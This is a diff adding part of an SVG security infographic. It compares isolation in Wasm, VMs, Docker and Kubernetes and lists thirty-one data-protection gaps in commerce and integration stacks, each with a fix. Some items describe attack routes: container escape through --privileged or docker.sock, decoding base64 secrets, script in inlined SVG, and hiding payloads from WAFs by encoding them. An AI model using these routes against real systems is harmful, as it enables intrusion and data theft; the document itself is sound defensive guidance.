+<text class="lab" x="1100" y="1962">WASM: SHOPIFY FUNCTIONS · WORKERS</text>
+<path class="rule" d="M60,1972H1540"/>
+<text class="bt" x="60" y="1994">Isolation</text>
+<text class="b" x="260" y="1994">Shared JVM process; quotas and governor limits</text>
+<text class="b" x="680" y="1994">Vendor tenancy: your data on Celigo&#x27;s platform</text>
+<text class="b" x="1100" y="1994">Own memory per module; a V8 isolate per Worker</text>
+<path class="rule" d="M60,2005H1540" style="stroke:#ddd"/>
+<text class="bt" x="60" y="2024">Network access</text>
+<text class="b" x="260" y="2024">Any library in the process can connect out</text>
+<text class="b" x="680" y="2024">Flows reach every connected system&#x27;s API</text>
+<text class="b" x="1100" y="2024">Functions: none. Workers: fetch via the host</text>
+<path class="rule" d="M60,2035H1540" style="stroke:#ddd"/>
+<text class="bt" x="60" y="2054">Memory safety</text>
+<text class="b" x="260" y="2054">Garbage-collected; secret Strings can&#x27;t be wiped</text>
+<text class="b" x="680" y="2054">PHP and ABAP are memory-safe; risk is config</text>
+<text class="b" x="1100" y="2054">Can&#x27;t touch host memory; Rust ownership inside</text>
+<path class="rule" d="M60,2065H1540" style="stroke:#ddd"/>
+<text class="bt" x="60" y="2084">Supply chain</text>
+<text class="b" x="260" y="2084">Large JAR trees; Log4Shell (2021)</text>
+<text class="b" x="680" y="2084">Magento extensions and checkout JS (Magecart)</text>
+<text class="b" x="1100" y="2084">Small modules; risk sits in the host imports</text>
+<path class="rule" d="M60,2095H1540" style="stroke:#ddd"/>
+<text class="bt" x="60" y="2114">Who patches</text>
+<text class="b" x="260" y="2114">Salesforce; you, for self-hosted Mule</text>
+<text class="b" x="680" y="2114">You: SAP Notes, Magento patches. Celigo: vendor</text>
+<text class="b" x="1100" y="2114">Shopify and Cloudflare; you rebuild the module</text>
+<path class="rule" d="M60,2125H1540" style="stroke:#ddd"/>
+<text class="bt" x="60" y="2144">Consent Mode v2</text>
+<text class="b" x="260" y="2144">Must survive every DataWeave map and job</text>
+<text class="b" x="680" y="2144">The ERP has no consent field: map it or lose it</text>
+<text class="b" x="1100" y="2144">Captured at the storefront, checked at the edge</text>
+<path class="rule" d="M60,2155H1540" style="stroke:#ddd"/>
+<text class="bt" x="60" y="2174">Idempotency</text>
+<text class="b" x="260" y="2174">Mule Idempotent Message Validator</text>
+<text class="b" x="680" y="2174">Service Bus duplicate detection; IDoc numbers</text>
+<text class="b" x="1100" y="2174">Event ID deduped in a Durable Object</text>
+<path class="rule" d="M60,2185H1540" style="stroke:#ddd"/>
+<text class="s" x="60" y="2234">Wasm doesn&#x27;t make data private; it limits what code can reach. Consent and idempotency are data rules, so every stack must carry them with every event.</text>
+<path class="rule" d="M60,2262H1540"/>
+<text class="sec" x="60" y="2290">ISOLATION AND TRANSPORT — A VM vs DOCKER vs KUBERNETES: WHERE THE WALL IS, AND HOW DATA CROSSES IT</text>
+<rect class="box" x="60" y="2308" width="473" height="290"/>
+<text class="bt" x="74" y="2332">Virtual machine</text>
+<text class="s" x="74" y="2349">each guest boots its own kernel</text>
+<rect class="box" x="563" y="2308" width="473" height="290"/>
+<text class="bt" x="577" y="2332">Docker container</text>
+<text class="s" x="577" y="2349">a process on the host&#x27;s kernel</text>
+<rect class="box" x="1066" y="2308" width="473" height="290"/>
+<text class="bt" x="1080" y="2332">Kubernetes cluster</text>
+<text class="s" x="1080" y="2349">containers scheduled across nodes</text>
+<rect class="box" x="74.0" y="2366" width="217.5" height="30"/>
+<text class="b" x="182.75" y="2385" text-anchor="middle">App</text>
+<rect class="box" x="74.0" y="2404" width="217.5" height="30"/>
+<text class="b" x="182.75" y="2423" text-anchor="middle">Guest kernel</text>
+<rect class="box" x="301.5" y="2366" width="217.5" height="30"/>
+<text class="b" x="410.25" y="2385" text-anchor="middle">App</text>
+<rect class="box" x="301.5" y="2404" width="217.5" height="30"/>
+<text class="b" x="410.25" y="2423" text-anchor="middle">Guest kernel</text>
+<rect x="74" y="2442" width="445" height="30" fill="#fff" stroke="#000" stroke-width="3"/>
+<text class="b" x="296.5" y="2461" text-anchor="middle">Hypervisor: the wall (KVM, Nitro, Hyper-V)</text>
+<rect class="box" x="74" y="2480" width="445" height="30"/>
+<text class="b" x="296.5" y="2499" text-anchor="middle">Hardware · cloud host</text>
+<text class="b" x="74" y="2538">Escape needs a hypervisor bug: rare and high value.</text>
+<text class="g" x="74" y="2558">The host can still read guest memory unless it&#x27;s a</text>
+<text class="g" x="74" y="2576">confidential VM (AMD SEV-SNP, Intel TDX).</text>
+<circle cx="513" cy="2554" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="513" y="2557.5">27</text>
+<rect class="box" x="577.0" y="2366" width="217.5" height="30"/>
+<text class="b" x="685.75" y="2385" text-anchor="middle">Container A</text>
+<rect class="box" x="804.5" y="2366" width="217.5" height="30"/>
+<text class="b" x="913.25" y="2385" text-anchor="middle">Container B</text>
+<rect class="gap" x="577" y="2404" width="445" height="30"/>
+<text class="b" x="799.5" y="2423" text-anchor="middle">namespaces · cgroups · seccomp · capabilities</text>
+<rect class="gap" x="577" y="2442" width="445" height="30"/>
+<text class="b" x="799.5" y="2461" text-anchor="middle">One shared host kernel: the only wall</text>
+<rect class="box" x="577" y="2480" width="445" height="30"/>
+<text class="b" x="799.5" y="2499" text-anchor="middle">Hardware · host</text>
+<text class="b" x="577" y="2538">Escape needs one kernel bug, --privileged, or a</text>
+<text class="b" x="577" y="2556">mounted docker.sock. Root on the host sees every container.</text>
+<text class="g" x="577" y="2576">ENV and COPY .env stay in image layers: docker history.</text>
+<circle cx="994" cy="2534" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="994" y="2537.5">23</text>
+<circle cx="1016" cy="2534" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1016" y="2537.5">26</text>
+<rect class="box" x="1080.0" y="2366" width="96.25" height="30"/>
+<text class="b" x="1128.125" y="2385" text-anchor="middle">Pod</text>
+<rect class="box" x="1184.25" y="2366" width="96.25" height="30"/>
+<text class="b" x="1232.375" y="2385" text-anchor="middle">Pod</text>
+<rect class="box" x="1080.0" y="2404" width="200.5" height="30"/>
+<text class="b" x="1180.25" y="2423" text-anchor="middle">Node 1 kernel</text>
+<rect class="box" x="1324.5" y="2366" width="96.25" height="30"/>
+<text class="b" x="1372.625" y="2385" text-anchor="middle">Pod</text>
+<rect class="box" x="1428.75" y="2366" width="96.25" height="30"/>
+<text class="b" x="1476.875" y="2385" text-anchor="middle">Pod</text>
+<rect class="box" x="1324.5" y="2404" width="200.5" height="30"/>
+<text class="b" x="1424.75" y="2423" text-anchor="middle">Node 2 kernel</text>
+<path class="ln" d="M1284.5,2381H1314.5" style="stroke-dasharray:4 3"/><path class="ah" d="M1320.5,2381l-6,-4v8z"/>
+<circle cx="1302.5" cy="2402" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1302.5" y="2405.5">25</text>
+<rect class="box" x="1080" y="2442" width="445" height="30"/>
+<text class="b" x="1302.5" y="2461" text-anchor="middle">Control plane · API server · RBAC</text>
+<rect class="gap" x="1080" y="2480" width="445" height="30"/>
+<text class="b" x="1302.5" y="2499" text-anchor="middle">etcd: Secrets stored as base64</text>
+<circle cx="1509" cy="2495" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1509" y="2498.5">24</text>
+<text class="b" x="1080" y="2538">Pod to pod, across nodes: plaintext by default, and</text>
+<text class="b" x="1080" y="2556">any pod can reach any pod until a NetworkPolicy says no.</text>
+<text class="g" x="1080" y="2576">Secrets are base64, not encrypted, unless etcd encryption is on.</text>
+<text class="lab" x="60" y="2642">CONCERN</text>
+<text class="lab" x="260" y="2642">VIRTUAL MACHINE</text>
+<text class="lab" x="680" y="2642">DOCKER</text>
+<text class="lab" x="1100" y="2642">KUBERNETES</text>
+<path class="rule" d="M60,2652H1540"/>
+<text class="bt" x="60" y="2674">Wall</text>
+<text class="b" x="260" y="2674">Hypervisor; a kernel per guest</text>
+<text class="b" x="680" y="2674">Shared host kernel: namespaces, cgroups, seccomp</text>
+<text class="b" x="1100" y="2674">Docker&#x27;s wall per node, plus RBAC on the API</text>
+<path class="rule" d="M60,2685H1540" style="stroke:#ddd"/>
+<text class="bt" x="60" y="2704">Escape needs</text>
+<text class="b" x="260" y="2704">A hypervisor bug: rare</text>
+<text class="b" x="680" y="2704">A kernel bug, --privileged or a mounted docker.sock</text>
+<text class="b" x="1100" y="2704">Any container escape, or a token with broad RBAC</text>
+<path class="rule" d="M60,2715H1540" style="stroke:#ddd"/>
+<text class="bt" x="60" y="2734">Traffic by default</text>
+<text class="b" x="260" y="2734">Over the VPC; not always encrypted</text>
+<text class="b" x="680" y="2734">Host bridge network: plaintext between containers</text>
+<text class="b" x="1100" y="2734">Flat network: any pod reaches any pod, in plaintext</text>
+<path class="rule" d="M60,2745H1540" style="stroke:#ddd"/>
+<text class="bt" x="60" y="2764">Encrypt in transit</text>
+<text class="b" x="260" y="2764">TLS, WireGuard or IPsec between VMs</text>
+<text class="b" x="680" y="2764">TLS inside each app; host root can still sniff</text>
+<text class="b" x="1100" y="2764">mTLS mesh (Istio, Linkerd) or WireGuard (Cilium, Calico)</text>
+<path class="rule" d="M60,2775H1540" style="stroke:#ddd"/>
+<text class="bt" x="60" y="2794">Secrets</text>
+<text class="b" x="260" y="2794">Cloud KMS or a vault; disk encryption</text>
+<text class="b" x="680" y="2794">Never in ENV or image layers; mount at runtime</text>
+<text class="b" x="1100" y="2794">Encrypt etcd with a KMS provider; prefer a vault</text>
+<path class="rule" d="M60,2805H1540" style="stroke:#ddd"/>
+<text class="bt" x="60" y="2824">Data in memory</text>
+<text class="b" x="260" y="2824">Host can read it, unless a confidential VM</text>
+<text class="b" x="680" y="2824">Host root and any privileged container</text>
+<text class="b" x="1100" y="2824">The node, and anyone allowed to exec into the pod</text>
+<path class="rule" d="M60,2835H1540" style="stroke:#ddd"/>
+<text class="s" x="60" y="2862">A VM is the stronger wall; a container is the faster one. Neither encrypts data on the wire: TLS, mTLS or WireGuard does that, one hop at a time.</text>
+<path class="rule" d="M60,2882H1540"/>
+<text class="sec" x="60" y="2910">THIRTY-ONE GAPS — AND THE CONTROL THAT CLOSES EACH</text>
+<circle cx="70" cy="2938" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="70" y="2941.5">1</text>
+<text class="bt" x="90" y="2942">Base64 is not encryption</text>
+<text class="g" x="90" y="2962">Anyone reverses it with atob() or base64 -d.</text>
+<text class="b" x="90" y="2980">Fix: Encrypt or tokenize. Never base64 a secret, API key, token or card number and call it hidden.</text>
+<circle cx="70" cy="3020" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="70" y="3023.5">2</text>
+<text class="bt" x="90" y="3024">Encoding hides payloads from filters</text>
+<text class="g" x="90" y="3044">A WAF or scanner looking for “&lt;script” misses it inside base64.</text>
+<text class="b" x="90" y="3062">Fix: Decode first, then sanitize: DOMPurify or svgo, stripping script, on* handlers, foreignObject, external href.</text>
+<circle cx="70" cy="3102" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="70" y="3105.5">3</text>
+<text class="bt" x="90" y="3106">SVG executes when inlined</text>
+<text class="g" x="90" y="3126">innerHTML, inline &lt;svg&gt;, &lt;object&gt;, &lt;iframe&gt; and same-origin uploads all run script.</text>
+<text class="b" x="90" y="3144">Fix: Render untrusted SVG with &lt;img&gt;. Send CSP: sandbox on .svg. Serve uploads from a separate asset domain.</text>
+<circle cx="70" cy="3184" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="70" y="3187.5">4</text>
+<text class="bt" x="90" y="3188">CORS is not access control</text>
+<text class="g" x="90" y="3208">Browsers honor it. curl, servers and AI agents ignore it.</text>
+<text class="b" x="90" y="3226">Fix: Authorize every request server-side, per record, in Xano or the Worker. Deny by default.</text>
+<circle cx="70" cy="3266" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="70" y="3269.5">5</text>
+<text class="bt" x="90" y="3270">The edge sees plaintext</text>
+<text class="g" x="90" y="3290">Cloudflare terminates TLS; Flexible mode sends plain HTTP to the origin.</text>
+<text class="b" x="90" y="3308">Fix: Use Full (strict). Sign a BAA before any PHI. Encrypt sensitive fields before they reach the edge.</text>
+<circle cx="70" cy="3348" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="70" y="3351.5">6</text>
+<text class="bt" x="90" y="3352">Logs keep what they&#x27;re sent</text>
+<text class="g" x="90" y="3372">Xano request history and Cloudflare logs can store full request bodies.</text>
+<text class="b" x="90" y="3390">Fix: Scrub fields or disable body logging. In Rust, Pii&lt;T&gt; redacts in Debug and refuses to serialize.</text>
+<circle cx="70" cy="3430" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="70" y="3433.5">7</text>
+<text class="bt" x="90" y="3434">SVG carries data, not just pixels</text>
+<text class="g" x="90" y="3454">&lt;text&gt;, &lt;metadata&gt; and XMP hold names and IDs. A chart of patient data is PHI.</text>
+<text class="b" x="90" y="3472">Fix: Strip metadata on export. Classify an exported SVG as the data it shows, with the same retention.</text>
+<circle cx="70" cy="3512" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="70" y="3515.5">8</text>
+<text class="bt" x="90" y="3516">The client is untrusted</text>
+<text class="g" x="90" y="3536">Elm prevents your own bugs, not an attacker editing the JavaScript.</text>
+<text class="b" x="90" y="3554">Fix: Enforce every rule again on the server. Treat Elm and Rust types as a second line, not the first.</text>
+<circle cx="70" cy="3594" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="70" y="3597.5">9</text>
+<text class="bt" x="90" y="3598">Compiled is not hidden</text>
+<text class="g" x="90" y="3618">Machine code disassembles and Elm output is readable JS. Keys shipped in either are public.</text>
+<text class="b" x="90" y="3636">Fix: Keep secrets on the server or in a key vault. Ship only tokens that are scoped, short-lived and revocable.</text>
+<circle cx="70" cy="3676" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="70" y="3679.5">10</text>
+<text class="bt" x="90" y="3680">Hydration ships data into the page</text>
+<text class="g" x="90" y="3700">Props serialized into the HTML (__NEXT_DATA__, the RSC payload) outlive TLS: View Source, saved pages, caches.</text>
+<text class="b" x="90" y="3718">Fix: Pass only what the screen needs. Never pass whole records as props. Fetch PII client-side, after consent.</text>
+<circle cx="70" cy="3758" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="70" y="3761.5">11</text>
+<text class="bt" x="90" y="3762">Shared caches mix customers</text>
+<text class="g" x="90" y="3782">A CDN or ISR cache of a personalized page can serve one customer&#x27;s data to the next visitor.</text>
+<text class="b" x="90" y="3800">Fix: Cache-Control: private, no-store on personalized routes. Keep PII out of static and ISR pages.</text>
+<circle cx="70" cy="3840" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="70" y="3843.5">12</text>
+<text class="bt" x="90" y="3844">Server fetch runs before consent</text>
+<text class="g" x="90" y="3864">Server Components call APIs on the first request, before the consent banner has loaded.</text>
+<text class="b" x="90" y="3882">Fix: Gate server fetches on the consent cookie. Defer personalization and tracking until the user agrees.</text>
+<circle cx="70" cy="3922" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="70" y="3925.5">13</text>
+<text class="bt" x="90" y="3926">NEXT_PUBLIC_ compiles into the bundle</text>
+<text class="g" x="90" y="3946">Any env var with that prefix is baked into client JavaScript at build time (see gap 9).</text>
+<text class="b" x="90" y="3964">Fix: Keep secrets server-only. Scan the built bundle for keys in CI before every deploy.</text>
+<circle cx="70" cy="4004" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="70" y="4007.5">14</text>
+<text class="bt" x="90" y="4008">TLS is hop-by-hop on a data bus</text>
+<text class="g" x="90" y="4028">The queue, Worker and logs each decrypt the message, and any of them can store it.</text>
+<text class="b" x="90" y="4046">Fix: Sign each message (HMAC or Ed25519). Encrypt sensitive fields end to end (JWE). Use mTLS between services.</text>
+<circle cx="70" cy="4086" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="70" y="4089.5">15</text>
+<text class="bt" x="90" y="4090">Unverified or replayed webhooks</text>
+<text class="g" x="90" y="4110">Anyone who finds the webhook URL can POST a fake or repeated event.</text>
+<text class="b" x="90" y="4128">Fix: Verify X-Shopify-Hmac-SHA256 on the raw body. Reject stale timestamps. Use idempotency keys.</text>
+<circle cx="70" cy="4168" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="70" y="4171.5">16</text>
+<text class="bt" x="90" y="4172">Queue rows outlive the message</text>
+<text class="g" x="90" y="4192">The webhook table keeps customer data after the event is processed.</text>
+<text class="b" x="90" y="4210">Fix: Store IDs, not payloads. Purge processed rows on a schedule. Encrypt the table at rest.</text>
+<circle cx="820" cy="2938" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="820" y="2941.5">17</text>
+<text class="bt" x="840" y="2942">Admin tokens at the edge</text>
+<text class="g" x="840" y="2962">A Shopify Admin token in KV or env grants the whole store if it leaks.</text>
+<text class="b" x="840" y="2980">Fix: Least-privilege scopes, short-lived tokens, rotation, and alerts on unusual use.</text>
+<circle cx="820" cy="3020" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="820" y="3023.5">18</text>
+<text class="bt" x="840" y="3024">Middleware sees everything</text>
+<text class="g" x="840" y="3044">MuleSoft and SFCC decrypt, transform and can log every payload and connector secret.</text>
+<text class="b" x="840" y="3062">Fix: Mask fields in DataWeave, use secure properties, turn off payload logging, encrypt sensitive fields.</text>
+<circle cx="820" cy="3102" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="820" y="3105.5">19</text>
+<text class="bt" x="840" y="3106">The JVM has no in-process sandbox</text>
+<text class="g" x="840" y="3126">The Security Manager is deprecated (Java 17), so every dependency runs with full app rights.</text>
+<text class="b" x="840" y="3144">Fix: Isolate services, scan dependencies, patch fast. Keep secrets short-lived and out of Strings.</text>
+<circle cx="820" cy="3184" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="820" y="3187.5">20</text>
+<text class="bt" x="840" y="3188">Consent isn&#x27;t carried with the event</text>
+<text class="g" x="840" y="3208">Audiences and conversions reach Google without their ad_user_data / ad_personalization state.</text>
+<text class="b" x="840" y="3226">Fix: Attach Consent Mode v2 state at capture. Drop or redact the event when consent is denied.</text>
+<circle cx="820" cy="3266" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="820" y="3269.5">21</text>
+<text class="bt" x="840" y="3270">Retries duplicate writes</text>
+<text class="g" x="840" y="3290">Timeouts, job re-runs and webhook redelivery create double conversions or records.</text>
+<text class="b" x="840" y="3308">Fix: One idempotency key per event, deduped with a TTL. Upsert on stable IDs such as offerId or SKU.</text>
+<circle cx="820" cy="3348" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="820" y="3351.5">22</text>
+<text class="bt" x="840" y="3352">Wasm host imports are the door</text>
+<text class="g" x="840" y="3372">A Wasm sandbox is only as tight as the functions the host gives it.</text>
+<text class="b" x="840" y="3390">Fix: Grant the fewest imports possible. Shopify Functions grant no network at all.</text>
+<circle cx="820" cy="3430" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="820" y="3433.5">23</text>
+<text class="bt" x="840" y="3434">Containers share the kernel</text>
+<text class="g" x="840" y="3454">One kernel bug, --privileged, or a mounted docker.sock hands over the whole host.</text>
+<text class="b" x="840" y="3472">Fix: Run as non-root, drop capabilities, use seccomp and a read-only FS. Use gVisor, Kata or a VM for untrusted code.</text>
+<circle cx="820" cy="3512" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="820" y="3515.5">24</text>
+<text class="bt" x="840" y="3516">Kubernetes Secrets are base64</text>
+<text class="g" x="840" y="3536">etcd stores them encoded, not encrypted: anyone with get-secrets or a backup reads them (gap 1).</text>
+<text class="b" x="840" y="3554">Fix: Turn on etcd encryption with a KMS provider, lock down RBAC on secrets, or use an external vault.</text>
+<circle cx="820" cy="3594" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="820" y="3597.5">25</text>
+<text class="bt" x="840" y="3598">Pod traffic is plaintext by default</text>
+<text class="g" x="840" y="3618">The cluster network is flat: any pod reaches any pod, unencrypted across nodes.</text>
+<text class="b" x="840" y="3636">Fix: Default-deny NetworkPolicy. mTLS through a service mesh, or WireGuard in the CNI. Don&#x27;t auto-mount tokens.</text>
+<circle cx="820" cy="3676" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="820" y="3679.5">26</text>
+<text class="bt" x="840" y="3680">Secrets baked into images</text>
+<text class="g" x="840" y="3700">ENV values and copied .env files live in image layers for good, readable with docker history.</text>
+<text class="b" x="840" y="3718">Fix: Use build secrets (--secret), scan images in CI, and inject secrets at runtime from a vault.</text>
+<circle cx="820" cy="3758" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="820" y="3761.5">27</text>
+<text class="bt" x="840" y="3762">The host can read VM memory</text>
+<text class="g" x="840" y="3782">The hypervisor and cloud operator can see guest RAM, including decrypted PHI and card data.</text>
+<text class="b" x="840" y="3800">Fix: Confidential VMs (AMD SEV-SNP, Intel TDX) for regulated workloads; keys in an HSM or KMS.</text>
+<circle cx="820" cy="3840" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="820" y="3843.5">28</text>
+<text class="bt" x="840" y="3844">The iPaaS keeps copies</text>
+<text class="g" x="840" y="3864">Celigo retries, error records and logs hold full payloads outside your own systems.</text>
+<text class="b" x="840" y="3882">Fix: Mask sensitive fields in the flow, shorten retention, and confirm the data region and DPA or BAA.</text>
+<circle cx="820" cy="3922" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="820" y="3925.5">29</text>
+<text class="bt" x="840" y="3926">Integration credentials are too broad</text>
+<text class="g" x="840" y="3946">SAP RFC users with wide roles; Magento integration tokens that never expire.</text>
+<text class="b" x="840" y="3964">Fix: Least privilege per interface, managed identity and Key Vault on Azure, scheduled rotation.</text>
+<circle cx="820" cy="4004" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="820" y="4007.5">30</text>
+<text class="bt" x="840" y="4008">Checkout JavaScript gets skimmed</text>
+<text class="g" x="840" y="4028">Magecart injects card skimmers into Magento checkouts, some hidden in SVG onload (gap 3).</text>
+<text class="b" x="840" y="4046">Fix: Patch fast. CSP and Subresource Integrity. PCI DSS 4.0 6.4.3 script inventory. Hosted payment fields.</text>
+<circle cx="820" cy="4086" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="820" y="4089.5">31</text>
+<text class="bt" x="840" y="4090">Batch files sit in plaintext</text>
+<text class="g" x="840" y="4110">IDoc and EDI flat files wait on SFTP drop folders between runs.</text>
+<text class="b" x="840" y="4128">Fix: PGP-encrypt files, delete them after pickup, and move to API or queue delivery where you can.</text>
+<text class="s" x="60" y="4260">Base64 changes how data is written, not who can read it. Compiling changes what code can do. TLS protects the wire, not the endpoints. Wasm, containers and VMs limit reach, not readership. Only encryption, server-side authorization and contracts decide who can read data.</text>
+</svg>
